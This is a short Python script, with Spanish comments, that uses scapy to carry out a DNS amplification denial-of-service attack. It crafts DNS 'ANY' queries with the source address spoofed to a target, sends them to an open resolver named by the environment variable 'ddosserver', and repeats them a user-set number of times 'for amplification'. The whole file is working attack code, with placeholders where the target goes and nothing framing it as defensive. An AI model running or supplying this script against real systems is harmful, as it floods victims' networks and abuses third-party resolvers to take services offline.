from scapy.all import *
import os
import sys

# Obtén la dirección IP del servidor desde la variable de entorno
ddosserver_ip = os.getenv("ddosserver")

if ddosserver_ip is None:
    print("No se proporcionó una dirección IP para el servidor. Asegúrate de configurar la variable de entorno ddosserver. Ejecuta export ddosserver=¨ip¨")
    exit()

if len(sys.argv) != 2:
    print("Usage: python3 dns_scapy.py <dns_query_packets>")
    exit(1)

try:
    dns_query_packets = int(sys.argv[1])
except ValueError:
    print("The argument value must be a valid integer.")
    exit(1)

target_ip = "example.com" # Replace with the target IP address
open_dns_resolver = ddosserver_ip # Replace with an open DNS resolver IP



# Craft DNS query packet
dns_query = IP(src=target_ip, dst=open_dns_resolver) / UDP(sport=RandShort(), dport=53) / \
DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
# Send the packet multiple times for amplification
send(dns_query, count= dns_query_packets)